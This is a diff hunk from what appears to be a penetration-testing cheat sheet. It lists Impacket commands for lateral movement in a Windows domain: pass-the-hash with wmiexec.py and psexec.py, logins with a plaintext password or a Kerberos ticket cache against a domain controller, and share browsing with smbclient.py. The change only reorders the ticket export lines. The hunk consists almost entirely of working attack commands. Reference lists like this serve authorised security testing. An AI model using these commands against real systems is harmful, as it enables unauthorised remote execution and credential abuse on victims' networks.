@@ -1802,15 +1802,17 @@ $ wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0405e42853c0f2cb0454964601
 $ wmiexec.py -hashes :0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
 
 => psexec.py
+$ export KRB5CCNAME=Administrator.ccache;
 $ psexec.py BANK\Administrator@10.10.10.10 -hashes 'aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0ax06b98c579x65e6'
 $ psexec.py bank.local/nik:'Password@123'@10.10.10.10
-$ export KRB5CCNAME=Administrator.ccache;psexec.py -dc-ip 10.10.10.10 -target-ip 10.10.10.10 -no-pass -k bank.local/Administrator@DC.bank.local
-$ export KRB5CCNAME=Administrator.ccache;psexec.py bank.local/Administrator@DC.bank.local -k -no-pass
+$ psexec.py -dc-ip 10.10.10.10 -target-ip 10.10.10.10 -no-pass -k bank.local/Administrator@DC.bank.local
+$ psexec.py bank.local/Administrator@DC.bank.local -k -no-pass
 
 => smbclient.py
+$ export KRB5CCNAME=Administrator.ccache;
 $ smbclient.py bank.local/nik:'Password@123'@10.10.10.10
-$ export KRB5CCNAME=Administrator.ccache;smbclient.py bank.local/administrator@dc.bank.local -dc-ip 10.10.10.10 -target-ip 10.10.10.10 -no-pass -k
-$ export KRB5CCNAME=Administrator.ccache;smbclient.py bank.local/administrator@dc.bank.local -no-pass -k
+$ smbclient.py bank.local/administrator@dc.bank.local -dc-ip 10.10.10.10 -target-ip 10.10.10.10 -no-pass -k
+$ smbclient.py bank.local/administrator@dc.bank.local -no-pass -k
 $ shares
 $ ls
 $ cd ..
